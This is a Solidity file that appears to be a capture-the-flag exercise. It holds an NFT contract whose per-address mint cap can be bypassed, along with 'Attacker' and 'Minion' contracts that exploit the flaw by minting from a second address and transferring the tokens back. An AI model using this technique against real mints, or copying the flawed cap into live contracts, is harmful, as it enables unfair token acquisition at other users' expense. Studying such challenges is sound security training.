// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

contract Attacker {
    Overmint2 public vulnerableNFT;
    Minion public minion;

    constructor(Overmint2 _vulnerableNFT, Minion _minion) {
        vulnerableNFT = _vulnerableNFT;
        minion = _minion;
    }

    function attack() external {
        vulnerableNFT.mint(); // Mint 1
        vulnerableNFT.mint(); // Mint 2
        vulnerableNFT.mint(); // Mint 3
        minion.delegateAttack();
    }
}

contract Minion {
    Overmint2 public vulnerableNFT;

    constructor(Overmint2 _vulnerableNFT) {
        vulnerableNFT = _vulnerableNFT;
    }

    function delegateAttack() external {
        vulnerableNFT.mint(); // Mint 4
        vulnerableNFT.mint(); // Mint 5

        // Transfer
        uint256 totalSupply = vulnerableNFT.totalSupply();
        vulnerableNFT.transferFrom(address(this), msg.sender, totalSupply);
        vulnerableNFT.transferFrom(address(this), msg.sender, totalSupply - 1);
    }
}
